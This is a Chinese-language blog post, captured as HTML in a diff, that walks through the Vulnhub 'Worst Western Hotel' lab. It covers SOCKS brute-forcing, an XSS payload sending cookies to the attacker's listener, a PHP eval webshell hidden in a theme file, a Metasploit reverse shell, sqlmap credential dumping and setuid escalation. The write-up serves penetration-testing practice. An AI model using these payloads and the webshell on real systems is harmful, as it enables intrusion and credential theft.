@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="aesm1p">
+
+
+
+    <meta name="description" content="相逢意气为君饮">
+
+
+
+<title>Vulnhub系列-Worst Western Hotel | aesm1p&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/a.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aesm1p&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aesm1p&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub系列-Worst Western Hotel</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">aesm1p</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 27, 2021&nbsp;&nbsp;22:31:57</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/vulnhub/">vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <img src="/2021/07/27/vulnhubHotelWW/1.jpg" class="">
+
+<span id="more"></span>
+
+<p>首先进行端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~/Desktop/hotelwww]</span><br><span class="line">└─$ nmap -sT -sV -p- -vv -A -oA nmap 192.168.56.115</span><br></pre></td></tr></table></figure>
+
+<p>访问80端口，但是会自动跳转到<code>prime.worstwestern.com</code>地址，所以在本地添加一个host记录将ip地址指向该url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ vi /etc/hosts</span><br><span class="line">192.168.56.115 prime.worstwestern.com</span><br><span class="line"># ipconfig /flushdns</span><br></pre></td></tr></table></figure>
+
+<p>但是访问速度很慢，接着我们爆破目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.115/ -k -x php,txt,html -t 40 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o dir.txt -b 404,302 --timeout 30s</span><br></pre></td></tr></table></figure>
+
+<p>得到一个&#x2F;config.txt目录，可以得到用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: Prime</span><br><span class="line">password: temppassword (changed regulary )</span><br></pre></td></tr></table></figure>
+
+<p>这个用户名和密码在80上无法使用，在1080端口上socks协议可以使用，但是文件说明密码会定时改变，所以我们进行一下爆破，这里有两个方法</p>
+<ol>
+<li>用hydra来进行爆破</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/hotelwww]</span><br><span class="line">└─$ hydra -l Prime -P /usr/share/wordlists/rockyou.txt -t 32 socks5://192.168.56.115:1080</span><br></pre></td></tr></table></figure>
+
+<p>可以爆破得到密码为<code>tinkerbell1</code></p>
+<ol start="2">
+<li>或者可以使用nmap的脚本来进行爆破</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/hotelwww]</span><br><span class="line">└─$ nmap --script socks-brute --script-args userdb=/tmp/user,passdb=/usr/share/wordlists/rockyou.txt -p 1080 192.168.56.115 -v</span><br></pre></td></tr></table></figure>
+
+<p>爆破之后用proxychains配置socks5协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5  192.168.56.115 1080 Prime tinkerbell1</span><br></pre></td></tr></table></figure>
+
+<p>然后使用socks代理来进行一下主机嗅探</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo proxychains netdiscover -i eth0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300</span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.0.1     08:00:27:d0:45:a0      1      60  PCS Systemtechnik GmbH</span><br><span class="line"> 192.168.1.1     08:00:27:d0:45:a0      1      60  PCS Systemtechnik GmbH</span><br><span class="line"> 192.168.56.1    0a:00:27:00:00:16      1      60  Unknown vendor</span><br><span class="line"> 192.168.56.100  08:00:27:92:9a:51      1      60  PCS Systemtechnik GmbH</span><br><span class="line"> 192.168.56.115  08:00:27:d0:45:a0      1      60  PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>
+
+<p>经过测试ip地址为<code>192.168.0.1</code>，挂代理之后再次扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q nmap -sT -sV -p- -vv -A -oA nmap0 192.168.0.1</span><br></pre></td></tr></table></figure>
+
+<p>扫描发现开启了22，80，443，1080端口，我们扫描443端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q dirb https://192.168.0.1</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: https://192.168.0.1/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.0.1/admin/</span><br><span class="line">==&gt; DIRECTORY: https://192.168.0.1/assets/</span><br><span class="line">==&gt; DIRECTORY: https://192.168.0.1/crm/</span><br><span class="line">+ https://192.168.0.1/index.php (CODE:200|SIZE:3370)</span><br><span class="line">+ https://192.168.0.1/server-status (CODE:403|SIZE:277)</span><br><span class="line"></span><br><span class="line">---- Entering directory: https://192.168.0.1/admin/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.0.1/admin/assets/</span><br><span class="line">+ https://192.168.0.1/admin/index.php (CODE:200|SIZE:3246)</span><br><span class="line"></span><br><span class="line">---- Entering directory: https://192.168.0.1/assets/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: https://192.168.0.1/crm/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: https://192.168.0.1/admin/assets/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br></pre></td></tr></table></figure>
+
+<p>扫描192.168.1.1&#x2F;24网段，可以扫到一个一台主机192.168.1.124，再次进行nmap扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q nmap -sT -p 22,80,443 192.168.1.124 -vv</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE  SERVICE REASON</span><br><span class="line">22/tcp  closed ssh     conn-refused</span><br><span class="line">80/tcp  open   http    syn-ack</span><br><span class="line">443/tcp open   https   syn-ack</span><br></pre></td></tr></table></figure>
+
+<p>因为是web网站，所以配置一下从浏览器访问比较好，但是支持socks5认证的浏览器比较难找，chrome浏览器不支持带认证的socks5协议，傲游5或者firefox可以，傲游6不可以。</p>
+<img src="/2021/07/27/vulnhubHotelWW/1.png" class="">
+
+<p>该网站登录出存在存储型XSS，可以利用该漏洞盗取cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img = document.createElement(&#x27;img&#x27;);img.width = 0;img.height = 0;img.src = &#x27;http://192.168.56.108:8000?cookie=&#x27;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本机监听8000端口可以接收到服务端传来的cookie，替换到网站访问首页。该网站是一个监控网站，在其中一张图片上泄露了用户名和密码（此处需要脑洞XD）</p>
+<img src="/2021/07/27/vulnhubHotelWW/2.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">peterg</span><br><span class="line">Birdistheword</span><br></pre></td></tr></table></figure>
+
+<p>该登录凭证可以登录192.168.56.108的80端口网站，但是在登录时必须要使用邮箱名称才能登录，所以这个地方需要一定的脑洞，需要我们猜测或者爆破后面的邮箱域名，不过还好不是很难猜，就是网站域名<code>worstwestern.com</code>，所以登录的凭证为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">peterg@worstwestern.com:Birdistheword</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/07/27/vulnhubHotelWW/3.png" class="">
+
+<p>在登录之后需要想办法获取一个webshell，一般更换主题模板的地方比较容易提权，因为可以导入PHP文件，这个网站的主题导入也可以进行提权，直接去找主题比较麻烦，也会出现问题，使用现有的主题新建一个主题，然后导出修改主题文件之后再打包上传，这样比较容易成功，修改主题文件的时候最好在zip文件中修改，要不修改之后打包可能会因为配置错误无法导入。</p>
+<img src="/2021/07/27/vulnhubHotelWW/4.png" class="">
+
+<p>修改themes\mytheme\lang下的index.php文件夹，写入webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 2007-2017 PrestaShop</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* NOTICE OF LICENSE</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* This source file is subject to the Academic Free License (AFL 3.0)</span></span><br><span class="line"><span class="comment">* that is bundled with this package in the file LICENSE.txt.</span></span><br><span class="line"><span class="comment">* It is also available through the world-wide-web at this URL:</span></span><br><span class="line"><span class="comment">* http://opensource.org/licenses/afl-3.0.php</span></span><br></pre></td></tr></table></figure>
+
+<p>然后将zip文件导入主题，该网站的主题文件存储在themes目录下，访问themes&#x2F;mytheme&#x2F;lang&#x2F;index.php文件可以得到上传的webshell，用蚁剑连接一下，后续要进行提权，用蚁剑自带的shell不方便，使用蚁剑的msf插件反弹一个shell</p>
+<img src="/2021/07/27/vulnhubHotelWW/5.png" class="">
+
+<p>在本地的kali上运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>查看ip地址，看到IP地址为192.168.0.100，与之前不在一个网段，我们要重新探测一下这个网段的服务，但是这个服务器上面没有nmap这些工具，可以用msf的工具来进行扫描，我们需要搭建一个socks代理，我本机安装的是msf6，在该版本下socks5的代理模块不是socks5而是socks_proxy</p>
+<img src="/2021/07/27/vulnhubHotelWW/6.png" class="">
+
+<p>配置一下socks5代理参数</p>
+<img src="/2021/07/27/vulnhubHotelWW/8.png" class="">
+
+<p>然后添加一条到192.168.0.0&#x2F;24网段的路由</p>
+<img src="/2021/07/27/vulnhubHotelWW/7.png" class="">
+
+<p>然后将启动的socks5服务器添加到proxychains中（这里的用户名和密码不是必须的，不配也可以，这里配置了用户名和密码是因为之前对网络环境理解有问题）</p>
+<img src="/2021/07/27/vulnhubHotelWW/9.png" class="">
+
+<p>接下来扫描一下该网段的主机和常见端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q nmap -vv -PE -sT -p 22,80,443 192.168.0.0/24</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/07/27/vulnhubHotelWW/10.png" class="">
+
+<p>扫描可知开启192.168.0.1开启了22,80,443端口，在本地浏览器配置socks代理访问该地址</p>
+<img src="/2021/07/27/vulnhubHotelWW/11.png" class="">
+
+<p>使用dirb进行一下爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q dirb https://192.168.0.1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: https://192.168.0.1/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.0.1/admin/</span><br><span class="line">==&gt; DIRECTORY: https://192.168.0.1/assets/</span><br><span class="line">==&gt; DIRECTORY: https://192.168.0.1/crm/</span><br></pre></td></tr></table></figure>
+
+<p>但是基本没什么用，经过测试可以知道首页的登录框存在sql注入</p>
+<img src="/2021/07/27/vulnhubHotelWW/12.png" class="">
+
+<p>但是这里是时间盲注，而忘记密码页面也存在sql注入，是布尔型注入，我们主要利用这个注入</p>
+<img src="/2021/07/27/vulnhubHotelWW/13.png" class="">
+
+<p>使用sqlmap进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q python3 /usr/share/sqlmap/sqlmap.py --dbms=mysql -p email --dbs -r request.txt --force-ssl --dbms=mysql</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">available databases [2]:</span><br><span class="line">[*] crm</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q python3 /usr/share/sqlmap/sqlmap.py --dbms=mysql -p email -r request.txt --force-ssl --dbms=mysql -D</span><br><span class="line">crm --tables</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: crm</span><br><span class="line">[5 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| user      |</span><br><span class="line">| admin     |</span><br><span class="line">| prequest  |</span><br><span class="line">| ticket    |</span><br><span class="line">| usercheck |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q python3 /usr/share/sqlmap/sqlmap.py --dbms=mysql -p email -r request.txt --force-ssl --dbms=mysql -D crm -T admin --dump-all</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Database: crm</span><br><span class="line">Table: user</span><br><span class="line">[7 entries]</span><br><span class="line">+----+-------------------------+------------------+</span><br><span class="line">| id | email                   | password         |</span><br><span class="line">+----+-------------------------+------------------+</span><br><span class="line">| 3  | peterg@worstwestern.com | TheBirdIsTheWord |</span><br><span class="line">| 7  | rahul@gmail.com         | 123456           |</span><br><span class="line">| 9  | demo@gmail.com          | Test@12345       |</span><br><span class="line">| 11 | testuser@gmail.com      | Test@123         |</span><br><span class="line">| 12 | abc@gmail.com           | Test@123         |</span><br><span class="line">| 13 | me@home.no              | Test             |</span><br><span class="line">| 14 | me@home2.no             | me               |</span><br><span class="line">+----+-------------------------+------------------+</span><br></pre></td></tr></table></figure>
+
+<p>从中可以得到ssh的登录凭证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">peterg:TheBirdIsTheWord</span><br></pre></td></tr></table></figure>
+
+<p>登录之后可以看到第二个flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">└─$ proxychains -q ssh peterg@192.168.0.1</span><br><span class="line">The authenticity of host &#x27;192.168.0.1 (192.168.0.1)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:cXxUcEbAI/Byk+TdYNS8RSDlsQSO4WmMICXUuejg5ac.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.0.1&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">peterg@192.168.0.1&#x27;s password:</span><br><span class="line">Linux hotelww 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">peterg@hotelww:~$ id</span><br><span class="line">uid=1000(peterg) gid=1000(peterg) groups=1000(peterg)</span><br><span class="line">peterg@hotelww:~$ whoami</span><br><span class="line">peterg</span><br><span class="line">peterg@hotelww:~$ ls</span><br><span class="line">Flag2.txt</span><br><span class="line">peterg@hotelww:~$ cat Flag2.txt</span><br><span class="line">6ebccebc6644299d554b7854bc22d297eb0d2335</span><br></pre></td></tr></table></figure>
+
+<p>使用提权工具peass进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Files with capabilities (limited to 50):</span><br><span class="line">/usr/bin/php7.3 = cap_setuid+ep</span><br><span class="line">cut: &#x27;&quot;&#x27;: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>可以看到可以通过suid进行提权，读到第三段flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">peterg@hotelww:~$ php -r &quot;posix_setuid(0); system(&#x27;$CMD&#x27;);&quot;</span><br><span class="line">PHP Warning:  system(): Cannot execute a blank command in Command line code on line 1</span><br><span class="line">peterg@hotelww:~$ php -r &quot;posix_setuid(0); system(&#x27;/bin/sh&#x27;);&quot;</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=1000(peterg) groups=1000(peterg)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=1000(peterg) groups=1000(peterg)</span><br><span class="line">ls</span><br><span class="line">Flag2.txt</span><br><span class="line">linpeas.sh</span><br><span class="line">cat /root</span><br><span class="line">cat: /root: Is a directory</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">Flag3.txt</span><br><span class="line">cat Flag3.txt</span><br><span class="line">c6d2ff8d486ef58f2aa8f16b4658884897230620</span><br></pre></td></tr></table></figure>
+
+<p>提权之后查看可以看到有多个网卡，使用docker来区分不同的业务</p>
+<img src="/2021/07/27/vulnhubHotelWW/14.png" class="">
+
+<img src="/2021/07/27/vulnhubHotelWW/15.png" class="">
+
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这个靶机是我目前做过的最好的一台靶机了，考察到的知识点也很丰富，后面值得好好消化</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>aesm1p</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2021/07/27/vulnhubHotelWW/">http://example.com/2021/07/27/vulnhubHotelWW/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/proxy/"># proxy</a>
+                    
+                        <a href="/tags/sqli/"># sqli</a>
+                    
+                        <a href="/tags/setuid/"># setuid</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/04/20/CVE-2022-22947/">CVE-2022-22947分析</a>
+            
+            
+            <a class="next" rel="next" href="/2021/07/26/vulnhubFawkes/">Vulnhub系列-Fawkes</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© aesm1p | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
